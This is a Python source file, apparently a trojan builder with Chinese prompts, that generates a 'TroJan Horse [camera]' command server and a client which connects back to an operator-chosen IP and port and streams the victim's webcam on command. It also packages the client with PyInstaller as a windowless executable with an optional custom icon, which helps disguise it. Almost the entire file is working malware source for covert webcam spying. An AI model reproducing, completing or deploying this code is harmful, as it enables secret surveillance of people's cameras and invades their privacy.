import os
import sys

camera_server = '''import socket
import cv2
import sys
import os
import numpy as np

title = f"""
TTTTTTTTTTTTTTTTTTTTTTT                                                JJJJJJJJJJJ                                  HHHHHHHHH     HHHHHHHHH                                                      
T:::::::::::::::::::::T                                                J:::::::::J                                  H:::::::H     H:::::::H                                                      
T:::::::::::::::::::::T                                                J:::::::::J                                  H:::::::H     H:::::::H                                                      
T:::::TT:::::::TT:::::T                                                JJ:::::::JJ                                  HH::::::H     H::::::HH                                                      
TTTTTT  T:::::T  TTTTTTrrrrr   rrrrrrrrr      ooooooooooo                J:::::J  aaaaaaaaaaaaa  nnnn  nnnnnnnn       H:::::H     H:::::H     ooooooooooo   rrrrr   rrrrrrrrr       ssssssssss        eeeeeeeeeeee    
        T:::::T        r::::rrr:::::::::r   oo:::::::::::oo              J:::::J  a::::::::::::a n:::nn::::::::nn     H:::::H     H:::::H   oo:::::::::::oo r::::rrr:::::::::r    ss::::::::::s     ee::::::::::::ee  
        T:::::T        r:::::::::::::::::r o:::::::::::::::o             J:::::J  aaaaaaaaa:::::an::::::::::::::nn    H::::::HHHHH::::::H  o:::::::::::::::or:::::::::::::::::r ss:::::::::::::s   e::::::eeeee:::::ee
        T:::::T        rr::::::rrrrr::::::ro:::::ooooo:::::o             J:::::j           a::::ann:::::::::::::::n   H:::::::::::::::::H  o:::::ooooo:::::orr::::::rrrrr::::::rs::::::ssss:::::s e::::::e     e:::::e
        T:::::T         r:::::r     r:::::ro::::o     o::::o             J:::::J    aaaaaaa:::::a  n:::::nnnn:::::n   H:::::::::::::::::H  o::::o     o::::o r:::::r     r:::::r s:::::s  ssssss  e:::::::eeeee::::::e
        T:::::T         r:::::r     rrrrrrro::::o     o::::oJ JJJJJJ     J:::::J  aa::::::::::::a  n::::n    n::::n   H::::::HHHHH::::::H  o::::o     o::::o r:::::r     rrrrrrr   s::::::s       e:::::::::::::::::e 
        T:::::T         r:::::r            o::::o     o::::oJ :::::J     J:::::J a::::aaaa::::::a  n::::n    n::::n   H:::::H     H:::::H  o::::o     o::::o r:::::r                  s::::::s    e::::::eeeeeeeeeee  
        T:::::T         r:::::r            o::::o     o::::oJ ::::::J   J::::::Ja::::a    a:::::a  n::::n    n::::n   H:::::H     H:::::H  o::::o     o::::o r:::::r            ssssss   s:::::s  e:::::::e           
      TT:::::::TT       r:::::r            o:::::ooooo:::::oJ :::::::JJJ:::::::Ja::::a    a:::::a  n::::n    n::::n HH::::::H     H::::::HHo:::::ooooo:::::o r:::::r            s:::::ssss::::::s e::::::::e          
      T:::::::::T       r:::::r            o:::::::::::::::o  JJ:::::::::::::JJ a:::::aaaa::::::a  n::::n    n::::n H:::::::H     H:::::::Ho:::::::::::::::o r:::::r            s::::::::::::::s   e::::::::eeeeeeee  
      T:::::::::T       r:::::r             oo:::::::::::oo     JJ:::::::::JJ    a::::::::::aa:::a n::::n    n::::n H:::::::H     H:::::::H oo:::::::::::oo  r:::::r             s:::::::::::ss     ee:::::::::::::e  
      TTTTTTTTTTT       rrrrrrr               ooooooooooo         JJJJJJJJJ       aaaaaaaaaa  aaaa nnnnnn    nnnnnn HHHHHHHHH     HHHHHHHHH   ooooooooooo    rrrrrrr              sssssssssss         eeeeeeeeeeeeee  
      
输入 'help' 获取帮助
{'=' * 214}
"""

help_server = """
============== 服务器命令 ==============
cls: 清屏
exit: 退出程序
help: 获取帮助
list: 列出所有客户端
sel [序列号]: 连接到客户端
open camera: 打开客户端摄像头
=======================================
"""

os.system('cls')
host = input('IP (默认 127.0.0.1) :') or "127.0.0.1"
port_input = input("端口 (默认 1000) :")
port = int(port_input) if port_input else 1000

os.system('cls')
print(title)

server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
server_socket.bind((host, port))
server_socket.listen(5)
print(f"服务器正在监听 {host}:{port}")

client_list = []
connected_client = None
while True:
    try:
        try:
            server_socket.settimeout(0.1)
            client_socket, address = server_socket.accept()
            print(f"新客户端已连接: {address}")
            client_list.append((client_socket, address))
        except socket.timeout:
            pass

        command = input("TroJan Horse [camera] $ >")

        if command.lower() == "help":
            print(help_server)
        elif command.lower() == "cls":
            os.system("cls")
            print(title)
        elif command == "exit":
            for client, _ in client_list:
                client.close()
            server_socket.close()
            sys.exit()

        elif command.lower() == "list":
            if not client_list:
                print("当前没有客户端连接")
            else:
                print("已连接客户端列表:")
                for i, (_, address) in enumerate(client_list):
                    print(f"{i}: {address}")
        elif command.lower().startswith('sel '):
            try:
                index = int(command.split(' ')[1])
                if 0 <= index < len(client_list):
                    connected_client = client_list[index][0]
                    print(f"已连接到客户端 {client_list[index][1]}")
                else:
                    print("无效的客户端序列号")
            except (IndexError, ValueError):
                print("请使用'sel [客户端序列号]'")
        elif command == "open camera":
            if connected_client is None:
                print("没有客户端连接")
            else:
                connected_client.sendall(command.encode())
                while True:
                    try:
                        data = connected_client.recv(16)
                        if not data:
                            break
                        frame_size = int(data.decode())
                        frame_data = b""
                        while len(frame_data) < frame_size:
                            remaining = frame_size - len(frame_data)
                            frame_data += connected_client.recv(min(4096, remaining))
                        frame = np.frombuffer(frame_data, dtype=np.uint8)
                        frame = cv2.imdecode(frame, cv2.IMREAD_COLOR)
                        cv2.imshow('客户端摄像头', frame)
                        if cv2.waitKey(1) & 0xFF == ord('q'):
                            break
                    except Exception as e:
                        print(f"错误: {e}")
                        break
                cv2.destroyAllWindows()
                connected_client.close()
                client_list = [client for client in client_list if client[0] != connected_client]
                connected_client = None
    except Exception as e:
        print(f"错误: {e}")
        if connected_client:
            connected_client.close()
            client_list = [client for client in client_list if client[0] != connected_client]
            connected_client = None
    except KeyboardInterrupt:
        sys.exit()'''

camera_client = '''while True:
    try:
        client_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        client_socket.connect((server_ip, server_port))
        print("已连接到服务器")
        cap = cv2.VideoCapture(0)
        while True:
            try:
                command = client_socket.recv(1024).decode()
                if command == "open camera":
                    while True:
                        ret, frame = cap.read()
                        if not ret:
                            break
                        _, buffer = cv2.imencode('.jpg', frame)
                        frame_data = buffer.tobytes()
                        frame_size = len(frame_data)
                        client_socket.sendall(str(frame_size).ljust(16).encode())
                        client_socket.sendall(frame_data)
                elif command == "exit":
                    break
            except (ConnectionRefusedError, ConnectionResetError):
                print("连接已丢失，正在尝试重新连接...")
                break
        cap.release()
        client_socket.close()
    except (ConnectionRefusedError, ConnectionResetError):
        print("连接失败")
        time.sleep(1)'''

def check():
    print("开始检查...")
    try:
        if sys.version_info[0] >= 3:
            print("当前运行的是Python 3.x或更高版本")
            if not os.path.isdir("program"):
                os.mkdir("program")

            if not os.path.isdir("server"):
                os.mkdir("server")

            if not os.path.isdir("client"):
                os.mkdir("client")

            if not os.path.exists("server/camera_server.txt"):
                with open("server/camera_server.txt", "w", encoding="utf-8") as f:
                    f.write(camera_server)

            if not os.path.exists("client/camera_client.txt"):
                with open("client/camera_client.txt", "w", encoding="utf-8") as f:
                    f.write(camera_client)

            os.system("pip show PyInstaller")
        else:
            print("当前运行的不是Python 3.x或更高版本")
            sys.exit()
    except Exception as e:
        print(f"检查时出错：{e}")
        sys.exit()

def pack():
    print("")

    one_file = input("是否打包为单文件?(y/n):")
    if one_file in ["y", "Y"]:
        one_file = "--onefile"
    else:
        one_file = ""

    icon = input("需要打包后有图标吗?(y/n):")
    if icon in ["y", "Y"]:
        icon_path = input("图标路径:")
        icon = f"--icon={icon_path}"
    else:
        icon = ""

    windowed = input("是否以窗口模式运行?(y/n):")
    if windowed in ["y", "Y"]:
        windowed = ""
    else:
        windowed = "--windowed"
        
    name = input("打包后的程序名称:")
    main_file_1 = input("主程序路径:")
    main_file_2 = f"{main_file_1}"

    if os.path.exists(f"dist/{name}.exe"):
        os.remove(f"dist/{name}.exe")
    else:
        pass

    if os.path.exists(f"{name}.spec"):
        os.remove(f"{name}.spec")
    else:
        pass

    os.system(f"pyinstaller {one_file} {icon} --name {name} {main_file_2}")
    os.remove(f"{name}.spec")

    print("")

def run_create_server_camera():
    try:
        file_name = "camera_server"
        target_dir = "program"
        if not os.path.exists(target_dir):
            os.makedirs(target_dir)
        with open(f"server/{file_name}.txt", "r", encoding="utf-8") as f:
            server = f.read()
            with open(f"{target_dir}/{file_name}.py", "w", encoding="utf-8") as f2:
                f2.write(server)
    except FileNotFoundError:
        print("木马 - 未找到服务器文件")
    except Exception as e:
        print(f"木马 - 创建 {file_name}.py 时出错: {e}")

def run_create_client_camera():
    try:
        file_name = "camera_client"
        target_dir = "program"
        server_ip = input("IP: ")
        server_port = input("端口: ")
        content = f'''import socket
import socket
import cv2
import time

server_ip = "{server_ip}"
server_port = {server_port}

'''
        with open(f"client/{file_name}.txt", "r", encoding="utf-8") as f:
            code = f.read()
            content = content + code
            with open(f"{target_dir}/{file_name}.py", "w", encoding="utf-8") as f2:
                f2.write(content)
    except FileNotFoundError:
        print("木马 - 未找到客户端文件")
    except Exception as e:
        print(f"木马 - 创建 {file_name}.py 时错误: {e}")